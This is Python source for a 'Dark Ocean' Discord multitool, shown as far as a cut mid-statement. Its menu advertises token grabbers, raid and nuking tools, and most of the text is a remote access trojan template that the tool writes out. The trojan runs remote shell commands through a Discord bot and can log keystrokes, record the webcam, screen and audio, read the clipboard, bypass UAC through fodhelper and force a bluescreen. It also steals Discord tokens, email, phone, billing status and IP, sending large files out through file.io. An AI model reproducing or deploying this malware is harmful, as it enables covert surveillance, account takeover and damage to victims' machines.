#SKID THIS = BLACKLISTED! <3
#Dark Ocean was made by bf#7704 | https://discord.gg/4eFHVxz9qX - https://discord.gg/2stGN7gpRw - https://discord.gg/7VyVQ5qsZZ


#Enjoy <3!


import os, sys, time, requests, os.path, base64, json, threading, string, random, discord, asyncio, httpx, pyautogui, re, http.client, subprocess, shutil
from discord_webhook import DiscordWebhook
from itertools import cycle
from discord.ext import commands
from selenium import webdriver
from datetime import datetime
from PIL import Image
from bs4 import BeautifulSoup
from random import randint
import emoji as ej
import lxml

def title():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""\n\n
    \t\t\t\t '||'''|.                '||         .|''''|,                               
    \t\t\t\t  ||   ||                 ||         ||    ||                               
    \t\t\t\t  ||   ||  '''|.  '||''|  || //`     ||    || .|'', .|''|,  '''|.  `||''|,  
    \t\t\t\t  ||   || .|''||   ||     ||<<       ||    || ||    ||..|| .|''||   ||  ||  
    \t\t\t\t .||...|' `|..||. .||.   .|| \\.      `|....|' `|..' `|...  `|..||. .||  ||. 
    \t\t\t\t 
    \t\t\t\t> Made by bf#7704 | discord.gg/2stGN7gpRw         \n\n\n\n""")
def checkvalidity():
    src = requests.get('https://discordapp.com/api/v6/auth/login', headers={'Authorization': usertoken})
    if src.status_code == 200:
        r = requests.get('https://discord.com/api/v9/users/@me', headers=getheaders(usertoken)).json()
        global username
        username = r.get("username") + "#" + r.get("discriminator")
    else:
        os.system('cls' if os.name == 'nt' else 'clear')
        title()
        login()

def login():
    global usertoken
    usertoken = input(" Token Of Acc: ")
    checkvalidity()
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    main()
    
def reset():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()

def main(): 
    print(f""" {username}> """, end="")
    choice = input()
    if choice == "tools":
        print(f"""\n\tTool Name\tDescription\n\t----------\t------------\n\tselfbot\t\tA simple SelfBot\n\trat\t\tGenerate a RAT.py file\n\traid\t\tSimple Raid Tool\n\tservnuker\tSimple Server Nuker\n\tvidcrash\tVideoCrash Maker\n\tmassreport\tMassive Report a User\n\twspam\t\tSpam WebHooks\n\tfilegrab\tGenerate a TokenGrabber.py file\n\timggrab\t\tCreate a TokenGrabber Image\n\tqrgen\t\tCreate a Fake QrCode Token\n\tipgrab\t\tGrab any User IP\n\taccnuker\tDestroy a Account\n\tdacc\t\tDisable a Account\n\tinfo\t\tGet info of a Discord User\n\tautolog\t\tAutologin with Token\n\tnitrogen\tGenerate Discord Nitro\n\tnsniper\t\tNitro Sniper\n\tcleardm\t\tCLear your DM with a User\n\thousechanger\tChange HypeSquad House\n\tschanger\tStatue Changer\n\tcycle\t\tCycle Discord Color Theme\n\twremover\tDelete a WebHooks Link\n""")
        main()
    elif choice == "selfbot":
        print(f"""\tNon-operational...\n""")
        main()
    elif choice == "rat":
        def discordrat():
            global filename, tokenbot
            fileName = str(input(f"""\t[+] Enter the name you want to give to the final file: """))
            tokenbot = str(input(f"""\t[+] Enter the token of the bot you will use to execute the RAT commands: """))

            try:
                with open(f"{fileName}.py", "w") as file:
                    file.write("""import winreg
import ctypes
import sys
import os
import ssl
import random
import threading
import time
import cv2
import subprocess
import discord
from comtypes import CLSCTX_ALL
from discord.ext import commands
from ctypes import *
import asyncio
import discord
from discord import utils
token = '~~TOKENHERE~~'
global appdata
appdata = os.getenv('APPDATA')
client = discord.Client()
bot = commands.Bot(command_prefix='!')
ssl._create_default_https_context = ssl._create_unverified_context
async def activity(client):
    import time
    import win32gui
    while True:
        global stop_threads
        if stop_threads:
            break
        current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        window_displayer = discord.Game(f"Visiting: {{current_window}}")
        await client.change_presence(status=discord.Status.online, activity=window_displayer)
        time.sleep(1)
def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()
@client.event
async def on_ready():
    import platform
    import re
    import urllib.request
    import json
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country_code']
        ip = data['IPv4']
    import os
    total = []
    global number
    number = 0
    global channel_name
    channel_name = None
    for x in client.get_all_channels(): 
        total.append(x.name)
    for y in range(len(total)):
        if "session" in total[y]:
            import re
            result = [e for e in re.split("[^0-9]", total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  
    if number == 0:
        channel_name = "session-1"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{{number}}"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@here :white_check_mark: New session opened {{channel_name}} | {{platform.system()}} {{platform.release()}} |  :flag_{{flag.lower()}}: | User : {{os.getlogin()}}"
    if is_admin == True:
        await channel.send(f'{{value1}} | admin!')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)
def critproc():
    import ctypes
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
def uncritproc():
    import ctypes
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
@client.event
async def on_message(message):
    if message.channel.name != channel_name:
        pass
    else:
        total = []
        for x in client.get_all_channels(): 
            total.append(x.name)
        if message.content.startswith("!kill"):
            try:
                if message.content[6:] == "all":
                    for y in range(len(total)): 
                        if "session" in total[y]:
                            channel_to_delete = discord.utils.get(client.get_all_channels(), name=total[y])
                            await channel_to_delete.delete()
                        else:
                            pass
                else:
                    channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
                    await channel_to_delete.delete()
                    await message.channel.send(f"[*] {{message.content[6:]}} killed.")
            except:
                await message.channel.send(f"[!] {{message.content[6:]}} is invalid,please enter a valid session name")
        if message.content == "!dumpkeylogger":
            import os
            temp = os.getenv("TEMP")
            file_keys = temp + r"\key_log.txt"
            file = discord.File(file_keys, filename="key_log.txt")
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.popen(f"del {{file_keys}}")
        if message.content == "!exit":
            import sys
            uncritproc()
            sys.exit()
        if message.content == "!windowstart":
            import threading
            global stop_threads
            stop_threads = False
            global _thread
            _thread = threading.Thread(target=between_callback, args=(client,))
            _thread.start()
            await message.channel.send("[*] Window logging for this session started")
        if message.content == "!windowstop":
            stop_threads = True
            await message.channel.send("[*] Window logging for this session stopped")
            game = discord.Game(f"Window logging stopped")
            await client.change_presence(status=discord.Status.online, activity=game)
        if message.content == "!screenshot":
            import os
            from mss import mss
            with mss() as sct:
                sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
            path = (os.getenv('TEMP')) + r"\monitor.png"
            file = discord.File((path), filename="monitor.png")
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.remove(path)
        if message.content == "!webcampic":
            import os
            import time
            import cv2
            temp = (os.getenv('TEMP'))
            camera_port = 0
            camera = cv2.VideoCapture(camera_port)
            #time.sleep(0.1)
            return_value, image = camera.read()
            cv2.imwrite(temp + r"\\temp.png", image)
            del(camera)
            file = discord.File(temp + r"\\temp.png", filename="temp.png")
            await message.channel.send("[*] Command successfuly executed", file=file)
        if message.content.startswith("!message"):
            import ctypes
            import time
            MB_YESNO = 0x04
            MB_HELP = 0x4000
            ICON_STOP = 0x10
            def mess():
                ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error", MB_HELP | MB_YESNO | ICON_STOP) #Show message box
            import threading
            messa = threading.Thread(target=mess)
            messa._running = True
            messa.daemon = True
            messa.start()
            import win32con
            import win32gui
            def get_all_hwnd(hwnd,mouse):
                def winEnumHandler(hwnd, ctx):
                    if win32gui.GetWindowText(hwnd) == "Error":
                        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        return None
                    else:
                        pass
                if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                    win32gui.EnumWindows(winEnumHandler,None)
            win32gui.EnumWindows(get_all_hwnd, 0)
        if message.content.startswith("!wallpaper"):
            import ctypes
            import os
            path = os.path.join(os.getenv('TEMP') + r"\\temp.jpg")
            await message.attachments[0].save(path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
            await message.channel.send("[*] Command successfuly executed")
        if message.content.startswith("!upload"):
            await message.attachments[0].save(message.content[8:])
            await message.channel.send("[*] Command successfuly executed")
        if message.content.startswith("!shell"):
            global status
            import time
            status = None
            import subprocess
            import os
            instruction = message.content[7:]
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            if status:
                result = str(shell().stdout.decode('CP437'))
                numb = len(result)
                if numb < 1:
                    await message.channel.send("[*] Command not recognized or no output was obtained")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    f1 = open(temp + r"\output.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File(temp + r"\output.txt", filename="output.txt")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                    dele = "del" + temp + r"\output.txt"
                    os.popen(dele)
                else:
                    await message.channel.send("[*] Command successfuly executed : " + result)
            else:
                await message.channel.send("[*] Command not recognized or no output was obtained")
                status = None
        if message.content.startswith("!download"):
            import subprocess
            import os
            filename=message.content[10:]
            check2 = os.stat(filename).st_size
            if check2 > 7340032:
                import requests
                await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
                response = requests.post('https://file.io/', files={{"file": open(filename, "rb")}}).json()["link"]
                await message.channel.send("download link: " + response)
                await message.channel.send("[*] Command successfuly executed")
            else:
                file = discord.File(message.content[10:], filename=message.content[10:])
                await message.channel.send("[*] Command successfuly executed", file=file)
        if message.content.startswith("!cd"):
            import os
            os.chdir(message.content[4:])
            await message.channel.send("[*] Command successfuly executed")
        if message.content == "!help":
            import os
            temp = (os.getenv('TEMP'))
            f5 = open(temp + r"\helpmenu.txt", 'a')
            f5.write(str(helpmenu))
            f5.close()
            temp = (os.getenv('TEMP'))
            file = discord.File(temp + r"\helpmenu.txt", filename="helpmenu.txt")
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.system(r"del %temp%\helpmenu.txt /f")
        if message.content.startswith("!write"):
            import pyautogui
            if message.content[7:] == "enter":
                pyautogui.press("enter")
            else:
                pyautogui.typewrite(message.content[7:])
        if message.content == "!clipboard":
            import ctypes
            import os
            CF_TEXT = 1
            kernel32 = ctypes.windll.kernel32
            kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
            kernel32.GlobalLock.restype = ctypes.c_void_p
            kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
            user32 = ctypes.windll.user32
            user32.GetClipboardData.restype = ctypes.c_void_p
            user32.OpenClipboard(0)
            if user32.IsClipboardFormatAvailable(CF_TEXT):
                data = user32.GetClipboardData(CF_TEXT)
                data_locked = kernel32.GlobalLock(data)
                text = ctypes.c_char_p(data_locked)
                value = text.value
                kernel32.GlobalUnlock(data_locked)
                body = value.decode()
                user32.CloseClipboard()
                await message.channel.send("[*] Command successfuly executed : " + "Clipboard content is : " + str(body))
        if message.content == "!sysinfo":
            import platform
            jak = str(platform.uname())
            intro = jak[12:]
            from requests import get
            ip = get('https://api.ipify.org').text
            pp = "IP Address = " + ip
            await message.channel.send("[*] Command successfuly executed : " + intro + pp)
        if message.content == "!geolocate":
            import urllib.request
            import json
            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                data = json.loads(url.read().decode())
                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                await message.channel.send("[*] Command successfuly executed : " + link)
        if message.content == "!admincheck":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                await message.channel.send("[*] Congrats you're admin")
            elif is_admin == False:
                await message.channel.send("[!] Sorry, you're not admin")
        if message.content == "!uacbypass":
            import winreg
            import ctypes
            import sys
            import os
            import time
            import inspect
            def isAdmin():
                try:
                    is_admin = (os.getuid() == 0)
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return is_admin
            if isAdmin():
                await message.channel.send("Your already admin!")
            else:
                await message.channel.send("attempting to get admin!")
                if message.content == "!uacbypass":
                    uncritproc()
                    test_str = sys.argv[0]
                    current_dir = inspect.getframeinfo(inspect.currentframe()).filename
                    cmd2 = current_dir
                    create_reg_path = \""" powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force \"""
                    os.system(create_reg_path)
                    create_trigger_reg_key = \""" powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force \"""
                    os.system(create_trigger_reg_key) 
                    create_payload_reg_key = \"""powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python \""" + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\\'"' + \""" -Force\"""
                    os.system(create_payload_reg_key)
                class disable_fsr():
                    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                    def __enter__(self):
                        self.old_value = ctypes.c_long()
                        self.success = self.disable(ctypes.byref(self.old_value))
                    def __exit__(self, type, value, traceback):
                        if self.success:
                            self.revert(self.old_value)
                with disable_fsr():
                    os.system("fodhelper.exe")  
                time.sleep(2)
                remove_reg = \""" powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force \"""
                os.system(remove_reg)
        if message.content == "!startkeylogger":
            import base64
            import os
            from pynput.keyboard import Key, Listener
            import logging
            temp = os.getenv("TEMP")
            log_dir = temp
            logging.basicConfig(filename=(log_dir + r"\key_log.txt"),
                                level=logging.DEBUG, format='%%(asctime)s: %%(message)s')
            def keylog():
                def on_press(key):
                    logging.info(str(key))
                with Listener(on_press=on_press) as listener:
                    listener.join()
            import threading
            global test
            test = threading.Thread(target=keylog)
            test._running = True
            test.daemon = True
            test.start()
            await message.channel.send("[*] Keylogger successfuly started")
        if message.content == "!stopkeylogger":
            import os
            test._running = False
            await message.channel.send("[*] Keylogger successfuly stopped")
        if message.content == "!idletime":
            class LASTINPUTINFO(Structure):
                _fields_ = [
                    ('cbSize', c_uint),
                    ('dwTime', c_int),
                ]
            def get_idle_duration():
                lastInputInfo = LASTINPUTINFO()
                lastInputInfo.cbSize = sizeof(lastInputInfo)
                if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
                    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                    return millis / 1000.0
                else:
                    return 0
            import threading
            global idle1
            idle1 = threading.Thread(target=get_idle_duration)
            idle1._running = True
            idle1.daemon = True
            idle1.start()
            duration = get_idle_duration()
            await message.channel.send('User idle for %%.2f seconds.' % duration)
            import time
            time.sleep(1)
        if message.content.startswith("!blockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(True)
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")
        if message.content.startswith("!unblockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(False)
                await  message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")
        if message.content == "!streamwebcam" :
            await message.channel.send("[*] Command successfuly executed")
            import os
            import time
            import cv2
            import threading
            import sys
            import pathlib
            temp = (os.getenv('TEMP'))
            camera_port = 0
            camera = cv2.VideoCapture(camera_port)
            running = message.content
            file = temp + r"\hobo\hello.txt"
            if os.path.isfile(file):
                delelelee = "del " + file + r" /f"
                os.system(delelelee)
                os.system(r"RMDIR %temp%\hobo /s /q")
            while True:
                return_value, image = camera.read()
                cv2.imwrite(temp + r"\\temp.png", image)
                boom = discord.File(temp + r"\\temp.png", filename="temp.png")
                kool = await message.channel.send(file=boom)
                temp = (os.getenv('TEMP'))
                file = temp + r"\hobo\hello.txt"
                if os.path.isfile(file):
                    del camera
                    break
                else:
                    continue
        if message.content == "!stopwebcam":  
            import os
            os.system(r"mkdir %temp%\hobo")
            os.system(r"echo hello>%temp%\hobo\hello.txt")
            os.system(r"del %temp\\temp.png /F")
        if message.content == "!getdiscordinfo":
            import os
            if os.name != "nt":
                exit()
            from re import findall
            from json import loads, dumps
            from base64 import b64decode
            from subprocess import Popen, PIPE
            from urllib.request import Request, urlopen
            from threading import Thread
            from time import sleep
            from sys import argv
            LOCAL = os.getenv("LOCALAPPDATA")
            ROAMING = os.getenv("APPDATA")
            PATHS = {
                "Discord": ROAMING + "\\\\Discord",
                "Discord Canary": ROAMING + "\\\\discordcanary",
                "Discord PTB": ROAMING + "\\\\discordptb",
                "Google Chrome": LOCAL + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
                "Opera": ROAMING + "\\\\Opera Software\\Opera Stable",
                "Brave": LOCAL + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
                "Yandex": LOCAL + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\Default"
            }
            def getHeader(token=None, content_type="application/json"):
                headers = {
                    "Content-Type": content_type,
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
                }
                if token:
                    headers.update({"Authorization": token})
                return headers
            def getUserData(token):
                try:
                    return loads(
                        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
                except:
                    pass
            def getTokenz(path):
                path += "\\\\Local Storage\\\\leveldb"
                tokens = []
                for file_name in os.listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in findall(regex, line):
                                tokens.append(token)
                return tokens
            def whoTheFuckAmI():
                ip = "None"
                try:
                    ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
                except:
                    pass
                return ip
            def hWiD():
                p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
                return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
            def getFriends(token):
                try:
                    return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                                headers=getHeader(token))).read().decode())
                except:
                    pass
            def getChat(token, uid):
                try:
                    return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
                                                data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
                except:
                    pass
            def paymentMethods(token):
                try:
                    return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                                        headers=getHeader(token))).read().decode())) > 0)
                except:
                    pass
            def sendMessages(token, chat_id, form_data):
                try:
                    urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
                                                                                                                    "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
                                    data=form_data.encode())).read().decode()
                except:
                    pass
            
            def main():
                cache_path = ROAMING + "\\\\.cache~$"
                prevent_spam = True
                self_spread = True
                embeds = []
                working = []
                checked = []
                already_cached_tokens = []
                working_ids = []
                ip = whoTheFuckAmI()
                pc_username = os.getenv("UserName")
                pc_name = os.getenv("COMPUTERNAME")
                user_path_name = os.getenv("userprofile").split("\\\\")[2]
                for platform, path in PATHS.items():
                    if not os.path.exists(path):
                        continue
                    for token in getTokenz(path):
                        if token in checked:
                            continue
                        checked.append(token)
                        uid = None
                        if not token.startswith("mfa."):
                            try:
                                uid = b64decode(token.split(".")[0].encode()).decode()
                            except:
                                pass
                            if not uid or uid in working_ids:
                                continue
                        user_data = getUserData(token)
                        if not user_data:
                            continue
                        working_ids.append(uid)
                        working.append(token)
                        username = user_data["username"] + "#" + str(user_data["discriminator"])
                        user_id = user_data["id"]
                        email = user_data.get("email")
                        phone = user_data.get("phone")
                        nitro = bool(user_data.get("premium_type"))
                        billing = bool(paymentMethods(token))
                        embed = f\"""
**Dark Ocean Multitool | Token Graber | By __Buffy2021#0001__** 
Email: {email}
Phone: {phone}
Nitro: {nitro}
Billing Info: {billing}
value: IP: {ip}
Username: {pc_username}
PC Name: {pc_name}
Token Location: {platform}     
Token : {token}                       
username: {username} ({user_id})
\"""
                        return str(embed)
            try:
                    embed = main()
                    await message.channel.send("[*] Command successfuly executed\\n"+str(embed))
            except Exception as e:
                    pass            
        if message.content == "!streamscreen" :
            await message.channel.send("[*] Command successfuly executed")
            import os
            from mss import mss
            temp = (os.getenv('TEMP'))
            hellos = temp + r"\hobos\hellos.txt"        
            if os.path.isfile(hellos):
                os.system(r"del %temp%\hobos\hellos.txt /f")
                os.system(r"RMDIR %temp%\hobos /s /q")      
            else:
                pass
            while True:
                with mss() as sct:
                    sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
                path = (os.getenv('TEMP')) + r"\monitor.png"
                file = discord.File((path), filename="monitor.png")
                await message.channel.send(file=file)
                temp = (os.getenv('TEMP'))
                hellos = temp + r"\hobos\hellos.txt"
                if os.path.isfile(hellos):
                    break
                else:
                    continue
                    
        if message.content == "!stopscreen":  
            import os
            os.system(r"mkdir %temp%\hobos")
            os.system(r"echo hello>%temp%\hobos\hellos.txt")
            os.system(r"del %temp%\monitor.png /F")
            
        if message.content == "!shutdown":
            import os
            uncritproc()
            os.system("shutdown /p")
            await message.channel.send("[*] Command successfuly executed")
            
        if message.content == "!restart":
            import os
            uncritproc()
            os.system("shutdown /r /t 00")
            await message.channel.send("[*] Command successfuly executed")
            
        if message.content == "!logoff":
            import os
            uncritproc()
            os.system("shutdown /l /f")
            await message.channel.send("[*] Command successfuly executed")
            
        if message.content == "!bluescreen":
            import ctypes
            import ctypes.wintypes
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
        if message.content == "!currentdir":
            import subprocess as sp
            output = sp.getoutput('cd')
            await message.channel.send("[*] Command successfuly executed")
            await message.channel.send("output is : " + output)
            
        if message.content == "!displaydir":
            import subprocess as sp
            import time
            import os
            import subprocess
            def shell():
                output = subprocess.run("dir", stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            if status:
                result = str(shell().stdout.decode('CP437'))
                numb = len(result)
                if numb < 1:
                    await message.channel.send("[*] Command not recognized or no output was obtained")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    if os.path.isfile(temp + r"\output22.txt"):
                        os.system(r"del %temp%\output22.txt /f")
                    f1 = open(temp + r"\output22.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File(temp + r"\output22.txt", filename="output22.txt")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                else:
                    await message.channel.send("[*] Command successfuly executed : " + result)  
        if message.content == "!dateandtime":
            import subprocess as sp
            output = sp.getoutput(r'echo time = %time%% date = %%date%')
            await message.channel.send("[*] Command successfuly executed")
            await message.channel.send("output is : " + output)
            
        if message.content == "!listprocess":
            import subprocess as sp
            import time
            import os
            import subprocess
            def shell():
                output = subprocess.run("tasklist", stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            if status:
                result = str(shell().stdout.decode('CP437'))
                numb = len(result)
                if numb < 1:
                    await message.channel.send("[*] Command not recognized or no output was obtained")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    if os.path.isfile(temp + r"\output.txt"):
                        os.system(r"del %temp%\output.txt /f")
                    f1 = open(temp + r"\output.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File(temp + r"\output.txt", filename="output.txt")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                else:
                    await message.channel.send("[*] Command successfuly executed : " + result)           
        if message.content.startswith("!prockill"):  
            import os
            proc = message.content[10:]
            kilproc = r"taskkill /IM" + ' "' + proc + '" ' + r"/f"
            import time
            import os
            import subprocess   
            os.system(kilproc)
            import subprocess
            time.sleep(2)
            process_name = proc
            call = 'TASKLIST', '/FI', 'imagename eq %%s' % process_name
            output = subprocess.check_output(call).decode()
            last_line = output.strip().split('\\r\\n')[-1]
            done = (last_line.lower().startswith(process_name.lower()))
            if done == False:
                await message.channel.send("[*] Command successfuly executed")
            elif done == True:
                await message.channel.send('[*] Command did not exucute properly') 
        if message.content.startswith("!recscreen"):
            import cv2
            import numpy as np
            import pyautogui
            reclenth = float(message.content[10:])
            input2 = 0
            while True:
                input2 = input2 + 1
                input3 = 0.045 * input2
                if input3 >= reclenth:
                    break
                else:
                    continue
            import os
            SCREEN_SIZE = (1920, 1080)
            fourcc = cv2.VideoWriter_fourcc(*"XVID")
            temp = (os.getenv('TEMP'))
            videeoo = temp + r"\output.avi"
            out = cv2.VideoWriter(videeoo, fourcc, 20.0, (SCREEN_SIZE))
            counter = 1
            while True:
                counter = counter + 1
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                out.write(frame)
                if counter >= input2:
                    break
            out.release()
            import subprocess
            import os
            temp = (os.getenv('TEMP'))
            check = temp + r"\output.avi"
            check2 = os.stat(check).st_size
            if check2 > 7340032:
                import requests
                await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
                boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                await message.channel.send("video download link: " + boom)
                await message.channel.send("[*] Command successfuly executed")
                os.system(r"del %temp%\output.avi /f")
            else:
                file = discord.File(check, filename="output.avi")
                await message.channel.send("[*] Command successfuly executed", file=file)
                os.system(r"del %temp%\output.avi /f")
        if message.content.startswith("!reccam"):
            import cv2
            import numpy as np
            import pyautogui
            input1 = float(message.content[8:])
            import cv2
            import os
            temp = (os.getenv('TEMP'))
            vid_capture = cv2.VideoCapture(0)
            vid_cod = cv2.VideoWriter_fourcc(*'XVID')
            loco = temp + r"\output.mp4"
            output = cv2.VideoWriter(loco, vid_cod, 20.0, (640,480))
            input2 = 0
            while True:
                input2 = input2 + 1
                input3 = 0.045 * input2
                ret,frame = vid_capture.read()
                output.write(frame)
                if input3 >= input1:
                    break
                else:
                    continue
            vid_capture.release()
            output.release()
            import subprocess
            import os
            temp = (os.getenv('TEMP'))
            check = temp + r"\output.mp4"
            check2 = os.stat(check).st_size
            if check2 > 7340032:
                import requests
                await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
                boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                await message.channel.send("video download link: " + boom)
                await message.channel.send("[*] Command successfuly executed")
                os.system(r"del %temp%\output.mp4 /f")
            else:
                file = discord.File(check, filename="output.mp4")
                await message.channel.send("[*] Command successfuly executed", file=file)
                os.system(r"del %temp%\output.mp4 /f")
        if message.content.startswith("!recaudio"):
            import cv2
            import numpy as np
            import pyautogui
            import os
            import sounddevice as sd
            from scipy.io.wavfile import write
            seconds = float(message.content[10:])
            temp = (os.getenv('TEMP'))
            fs = 44100
            laco = temp + r"\output.wav"
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            write(laco, fs, myrecording)
            import subprocess
            import os
            temp = (os.getenv('TEMP'))
            check = temp + r"\output.wav"
            check2 = os.stat(check).st_size
            if check2 > 7340032:
                import requests
                await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
                boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                await message.channel.send("video download link: " + boom)
                await message.channel.send("[*] Command successfuly executed")
                os.system(r"del %temp%\output.wav /f")
            else:
                file = discord.File(check, filename="output.wav")
                await message.channel.send("[*] Command successfuly executed", file=file)
                os.system(r"del %temp%\output.wav /f")
        if message.content.startswith("!delete"):
            global statue
            import time
            import subprocess
            import os
            instruction = message.content[8:]
            instruction = "del " + '"' + instruction + '"' + " /F"
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            global statue
            statue = "ok"
            if statue:
                numb = len(result)
                if numb > 0:
                    await message.channel.send("[*] an error has occurred")
                else:
